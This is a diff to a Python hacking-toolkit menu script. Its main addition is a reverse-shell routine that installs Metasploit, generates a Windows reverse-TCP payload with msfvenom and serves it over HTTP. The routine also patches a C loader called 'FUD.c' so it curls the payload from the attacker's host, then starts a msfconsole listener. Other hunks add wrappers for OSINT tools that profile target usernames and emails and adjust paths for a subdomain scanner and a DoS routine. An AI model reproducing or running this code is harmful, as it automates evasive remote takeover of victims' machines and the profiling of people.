@@ -6,6 +6,7 @@ import json
 import logging
 import os
 import random
+import tempfile
 import re
 import socket
 import subprocess
@@ -20,6 +21,7 @@ import colorama
 import dns.resolver
 import requests
 import whois
+import shutil
 from colorama import Fore, Style
 from requests.structures import CaseInsensitiveDict
 from scapy.all import sniff, ARP, send, DNSQR, IP, getmacbyip, Ether, sendp, conf
@@ -51,6 +53,9 @@ def check_distro():
         return "unknown"
 
 
+
+def is_command_available(cmd):
+    return shutil.which(cmd) is not None
 
 
 def close_program():
@@ -206,7 +211,7 @@ def load_wordlist(file_path):
 def subdomain_scanner():
     try:
         domain = input(f"{Fore.YELLOW}Target domain (e.g. example.com): {Style.RESET_ALL}")
-        wordlist = load_wordlist("big.txt")
+        wordlist = load_wordlist(".files/big.txt")
 
         if not wordlist:
             print(f"{Fore.RED}Aborting scan: no subdomains loaded.{Style.RESET_ALL}")
@@ -376,7 +381,7 @@ def remote_access():
 
     match s:
         case "1":
-            revshell()
+            revshell(".files/.payload/main.c")
         case "0":
             main()
     #text_animation(" Coming Soon ;) Returning at the menu in 3 sec...",0.01)
@@ -384,8 +389,100 @@ def remote_access():
     #main()
     
     
-def revshell():
-    pass
+
+def update_c_file(c_file_path, ip, port, output_path):
+    import re
+    with open(c_file_path, "r") as file:
+        content = file.read()
+
+    new_command = f'char *command = "curl http://{ip}:{port}/code.bin";'
+    content = re.sub(r'char \*command = "curl http://.*";', new_command, content)
+
+    with open(output_path, "w") as file:
+        file.write(content)
+
+
+def revshell(template_c_path):
+    menu_intro("Reverse Shell")
+
+    if not is_command_available("msfvenom"):
+        temp_dir = "/tmp/msf_install"
+        os.makedirs(temp_dir, exist_ok=True)
+        current_dir = os.getcwd()
+        os.chdir(temp_dir)
+
+        text_animation(f"{Fore.YELLOW}[-] msfvenom not found, starting Metasploit installation...{Style.RESET_ALL}\n", 0.05)
+        subprocess.run(
+            ["sudo", "apt", "install", "gpgv2", "autoconf", "bison", "build-essential", "postgresql",
+             "libaprutil1", "libgmp3-dev", "libpcap-dev", "openssl", "libpq-dev", "libreadline6-dev",
+             "libsqlite3-dev", "libssl-dev", "locate", "libsvn1", "libtool", "libxml2", "libxml2-dev",
+             "libxslt-dev", "wget", "libyaml-dev", "ncurses-dev", "postgresql-contrib", "xsel",
+             "zlib1g", "zlib1g-dev", "curl", "-y"],
+            stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL
+        )
+        subprocess.run(
+            ["sudo", "curl", "https://raw.githubusercontent.com/rapid7/metasploit-omnibus/master/config/templates/metasploit-framework-wrappers/msfupdate.erb",
+             "-o", "msfinstall"],
+            stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL
+        )
+        subprocess.run(
+            ["sudo", "chmod", "755", "msfinstall"],
+            stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL
+        )
+        subprocess.run(
+            ["./msfinstall"],
+            stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL
+        )
+
+        text_animation(f"{Fore.GREEN}[+] Metasploit Framework successfully installed!{Style.RESET_ALL}", 0.05)
+        os.chdir(current_dir)
+    else:
+        current_dir = os.getcwd()
+
+    payload_dir = os.path.join(current_dir, "payloads")
+    os.makedirs(payload_dir, exist_ok=True)
+
+    ip = input(f"{Fore.GREEN}{Style.BRIGHT}> {Fore.CYAN}[+] Enter your local IP (LHOST) > {Style.RESET_ALL}")
+    port = input(f"{Fore.GREEN}{Style.BRIGHT}> {Fore.CYAN}[+] Enter port (LPORT) > {Style.RESET_ALL}")
+
+    payload_path = os.path.join(payload_dir, "payload.bin")
+    text_animation(f"\n{Fore.CYAN}[-] Generating payload with msfvenom...{Style.RESET_ALL}", 0.04)
+    subprocess.run(
+        ["msfvenom", "-p", "windows/x64/shell_reverse_tcp", f"LHOST={ip}", f"LPORT={port}", "-f", "raw", "-o", payload_path],
+        stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL
+    )
+    text_animation(f"\n{Fore.GREEN}[+] Payload generated and saved at: {payload_path}{Style.RESET_ALL}", 0.05)
+
+    server_port = input(f"\n\n{Fore.GREEN}{Style.BRIGHT}> {Fore.CYAN}[+] Enter port to start Python HTTP server > {Style.RESET_ALL}")
+    server_cmd = f"cd {payload_dir} && python3 -m http.server {server_port}"
+    os.system(f'gnome-terminal -- bash -c "{server_cmd}; exec bash"')
+    text_animation(f"\n{Fore.YELLOW}[i] Python HTTP server started in new terminal at port {server_port}{Style.RESET_ALL}\n", 0.05)
+
+    modified_c_path = os.path.join(payload_dir, "FUD.c")
+    update_c_file(template_c_path, ip, server_port, modified_c_path)
+    text_animation(f"\n{Fore.GREEN}[+] Modified C payload saved at: {modified_c_path}{Style.RESET_ALL}\n", 0.05)
+
+    with tempfile.NamedTemporaryFile(mode='w', delete=False, suffix=".rc") as rc_file:
+        rc_file.write(
+            f"use exploit/multi/handler\n"
+            f"set payload windows/x64/shell_reverse_tcp\n"
+            f"set LHOST {ip}\n"
+            f"set LPORT {port}\n"
+            f"exploit -j -z\n"
+        )
+        rc_path = rc_file.name
+
+    # Avvia msfconsole in nuovo terminale usando il file resource
+    os.system(f'gnome-terminal -- bash -c "msfconsole -r {rc_path}; exec bash"')
+    text_animation(f"\n{Fore.YELLOW}[i] Metasploit listener started in new terminal{Style.RESET_ALL}\n", 0.05)
+
+
+
+
+
+    
+
+
 
 
 ###############################################################################################################################
@@ -530,75 +627,92 @@ def setup(tool):
 
 
 def sherlock():
+    # Fatto
     menu_intro("Sherlock Osint Tool")
     s = input(f"{Fore.GREEN} Username > {Style.RESET_ALL}")
     print("\n")
     os.system(f"sherlock {s}")
     ask_next_action(sherlock, osint, "OSINT")
-    
 
 
 def maigret():
+    # Fatto
     menu_intro("Maigret Osint Tool")
     s = input(f"{Fore.GREEN} Username > {Style.RESET_ALL}")
     os.system(f"maigret {s}")
     ask_next_action(maigret, osint, "OSINT")
-    
-    
+
+
 def socialscan():
+    # Fatto
     menu_intro("SocialScan Osint Tool")
     s = input(f"{Fore.GREEN} Username > {Style.RESET_ALL}")
     os.system(f"socialscan {s}")
     ask_next_action(socialscan, osint, "OSINT")
 
 
+def holehe():
+    menu_intro("Holehe Tool")
+    email = input(f"{Fore.GREEN} Email > {Style.RESET_ALL}")
+    os.system(f"holehe {email}")
+    ask_next_action(holehe, osint, "OSINT")
+
+
+
+def ghunt():
+    config_path = os.path.expanduser("~/.config/ghunt/config.json")
+    
+    menu_intro("GHunt Tool")
+    os.system("ghunt login")
+    ask_next_action(ghunt, osint, "OSINT")
+
+
+def toutatis():
+    # Fatto
+    menu_intro("Toutatis Tool")
+    session_id = input(f"{Fore.GREEN} your session_id > {Style.RESET_ALL}")
+    target = input(f"{Fore.GREEN} target username > {Style.RESET_ALL}")
+    os.system(f"toutatis -s {session_id} -u {target}")
+    ask_next_action(toutatis, osint, "OSINT")
+
+
+def instaloader():
+    # non fatto
+    menu_intro("Instaloader Tool")
+    username = input(f"{Fore.GREEN} Your Username > {Style.RESET_ALL}")
+    os.system(f"instaloader --login={username}")
+    ask_next_action(instaloader, osint, "OSINT")
+
+
 tools = {
     "maigret": maigret,
     "sherlock": sherlock,
-    #"blackbird": blackbird,
-    #"wmn": wmn,
     "socialscan": socialscan,
-    #"toutatis": toutatis,
-    #"osintgram": osintgram,
-    #"instaloader": instaloader,
-    #"igscraper": igscraper,
-    #"iglooter": iglooter,
-    #"holehe": holehe,
-    #"eyes": eyes,
+    "holehe": holehe,
     #"ghunt": ghunt,
-    #"reconng": reconng,
-    #"mrholmes": mrholmes,
-    #"spiderfoot": spiderfoot,
+    "toutatis": toutatis,
+    #"instaloader": instaloader
 }
 
 tools_install = {
     "sherlock": "sherlock-project",
     "maigret": "maigret",
-    "socialscan": "socialscan"
+    "socialscan": "socialscan",
+    "holehe": "holehe",
+    "ghunt": "GHunt",
+    "toutatis": "toutatis",
+    "instaloader": "instaloader"
 }
 
-       
+
 def osint():
     try:
         menu_intro("OSINT")
-
-        print(f"{Fore.GREEN}+{'-'*37}+{'-'*37}+{Style.RESET_ALL}")
-        print(f"{Fore.GREEN}|{Style.RESET_ALL}          {Fore.YELLOW}--- Usernames ---{Style.RESET_ALL}          {Fore.GREEN}|{Style.RESET_ALL}          {Fore.YELLOW}--- Instagram ---{Style.RESET_ALL}          {Fore.GREEN}|{Style.RESET_ALL}")
-        print(f"{Fore.GREEN}|{Style.RESET_ALL} [{Fore.WHITE}1{Style.RESET_ALL}] Sherlock                       {Fore.GREEN} |{Style.RESET_ALL} [{Fore.WHITE}6{Style.RESET_ALL}] Toutatis                       {Fore.GREEN} |{Style.RESET_ALL}")
-        print(f"{Fore.GREEN}|{Style.RESET_ALL} [{Fore.WHITE}2{Style.RESET_ALL}] Maigret                        {Fore.GREEN} |{Style.RESET_ALL} [{Fore.WHITE}7{Style.RESET_ALL}] Osintgram                      {Fore.GREEN} |{Style.RESET_ALL}")
-        print(f"{Fore.GREEN}|{Style.RESET_ALL} [{Fore.WHITE}3{Style.RESET_ALL}] Blackbird                      {Fore.GREEN} |{Style.RESET_ALL} [{Fore.WHITE}8{Style.RESET_ALL}] Instaloader                    {Fore.GREEN} |{Style.RESET_ALL}")
-        print(f"{Fore.GREEN}|{Style.RESET_ALL} [{Fore.WHITE}4{Style.RESET_ALL}] What's my name                  {Fore.GREEN}|{Style.RESET_ALL} [{Fore.WHITE}9{Style.RESET_ALL}] IgScraper                     {Fore.GREEN}  |{Style.RESET_ALL}")
-        print(f"{Fore.GREEN}|{Style.RESET_ALL} [{Fore.WHITE}5{Style.RESET_ALL}] SocialScan                     {Fore.GREEN} |{Style.RESET_ALL} [{Fore.WHITE}10{Style.RESET_ALL}] InstaLooter                    {Fore.GREEN}|{Style.RESET_ALL}")
-        print(f"{Fore.GREEN}+{'-'*37}+{'-'*37}+{Style.RESET_ALL}")
-
-        print(f"{Fore.GREEN}+{'-'*37}+{'-'*37}+{Style.RESET_ALL}")
-        print(f"{Fore.GREEN}|{Style.RESET_ALL}          {Fore.YELLOW}--- Email ---{Style.RESET_ALL}            {Fore.GREEN}  | {Style.RESET_ALL}          {Fore.YELLOW}--- Frameworks ---{Style.RESET_ALL}        {Fore.GREEN}|{Style.RESET_ALL}")
-        print(f"{Fore.GREEN}|{Style.RESET_ALL} [{Fore.WHITE}11{Style.RESET_ALL}] Holehe                         {Fore.GREEN}|{Style.RESET_ALL} [{Fore.WHITE}14{Style.RESET_ALL}] Recon-ng                  {Fore.GREEN}     |{Style.RESET_ALL}")
-        print(f"{Fore.GREEN}|{Style.RESET_ALL} [{Fore.WHITE}12{Style.RESET_ALL}] Eyes                           {Fore.GREEN}|{Style.RESET_ALL} [{Fore.WHITE}15{Style.RESET_ALL}] Mr.Holmes                      {Fore.GREEN}|{Style.RESET_ALL}")
-        print(f"{Fore.GREEN}|{Style.RESET_ALL} [{Fore.WHITE}13{Style.RESET_ALL}] GHunt                          {Fore.GREEN}|{Style.RESET_ALL} [{Fore.WHITE}16{Style.RESET_ALL}] Spiderfoot                     {Fore.GREEN}|{Style.RESET_ALL}")
-        print(f"{Fore.GREEN}+{'-'*37}+{'-'*37}+{Style.RESET_ALL}\n")
-
-        print(f" [{Style.RESET_ALL}{Fore.RED}0{Style.RESET_ALL}] {Fore.CYAN}Menu{Style.RESET_ALL}\n")
+        # ... [mantieni lo stesso menu grafico]
+        
+        text_animation(f"{Fore.RED}[!] This section is still in development...{Style.RESET_ALL}", 0.01)
+        time.sleep(3)
+        main()
 
         s = input(f"{Fore.GREEN} root@{username}/OSINT:~$ {Style.RESET_ALL}")
 
@@ -609,42 +723,30 @@ def osint():
                 setup("sherlock")
             case "2":
                 setup("maigret")
-            #case "3":
-            #    blackbird()
-            #case "4":
-            #    WMN()
-            #case "5":
-            #    setup("socialscan")
-            #case "6":
-            #    toutatis()
-            #case "7":
-            #    osintgram()
-            #case "8":
-            #    instaloader()
-            #case "9":
-            #    igscraper()
-            #case "10":
-            #    iglooter()
-            #case "11":
-            #    holehe()
-            #case "12":
-            #    eyes()
-            #case "13":
-            #    GHunt()
-            #case "14":
-            #    ReconNg()
-            #case "15":
-            #    mrHolmes()
-            #case "15":
-            #    spiderfoot()
+            case "5":
+                setup("socialscan")
+            case "6":
+                setup("toutatis")
+            case "8":
+                setup("instaloader")
+            case "11":
+                setup("holehe")
+            case "13":
+                setup("ghunt")
+            # puoi aggiungere anche gli altri seguendo lo stesso schema
 
-        if s != "1" or s != "2" or s != "5":
-            text_animation(f"\n{Fore.RED}[!] This section is still in developing, only 1,2 and 5 is available now :') {Style.RESET_ALL}", 0.01)
-            time.sleep(3)
-            osint()
+        #if s not in ["1", "2", "5", "6", "8", "11", "13"]:
+        #    text_animation(f"\n{Fore.RED}[!] This section is still in development...{Style.RESET_ALL}", 0.01)
+        #    time.sleep(3)
+        #    osint()
+        
+        text_animation(f"\n{Fore.RED}[!] This section is still in development...{Style.RESET_ALL}", 0.01)
+        time.sleep(3)
+        main()
 
     except KeyboardInterrupt:
         close_program()
+
 
 
 
@@ -729,7 +831,7 @@ def dos():
         w = Queue()
 
         # Read headers
-        with open("headers.txt", "r") as headers:
+        with open(".files/headers.txt", "r") as headers:
             global data
             data = headers.read()
 
